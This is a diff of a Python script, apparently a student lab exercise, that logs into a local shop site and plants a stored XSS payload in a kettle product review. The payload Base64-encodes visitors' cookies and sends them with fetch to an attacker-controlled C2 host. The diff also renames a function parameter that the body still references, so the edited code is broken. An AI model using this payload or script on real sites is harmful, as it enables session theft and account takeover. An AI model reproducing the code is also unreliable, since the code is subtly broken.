@@ -20,6 +20,8 @@ ATTACKER_IP = detect_lan_ip() or input("Could not auto-detect LAN IP. Enter atta
 
 # --- XSS Payload ---
 # The code that steals the cookie and sends it to your C2 server
+# btoa - a function that encodes a string to Base64 to hide the cookies
+# fetch - a function that sends a request to the attacker server
 PAYLOAD = f"""
 The handle gets too hot, and there's a weird smell.<script>
     var encoded = btoa(document.cookie);
@@ -27,7 +29,9 @@ The handle gets too hot, and there's a weird smell.<script>
 </script>
 """
 
-def perform_stored_xss(username="HUCKER", password="hucker123", target_url="http://localhost/CyberProject/product_view.php?id=81"):  # The ID of the electric kettle in the DB is 81
+# The ID of the electric kettle in the DB is 81
+def perform_stored_xss(username="HUCKER", password="hucker123", vulnerable_site_url="http://localhost/CyberProject/product_view.php?id=81"):
+    # split() returns a list of the parts of the URL [0] is the base url
     base_url = target_url.split("/product_view.php")[0]
     login_url = f"{base_url}/login.php"
 
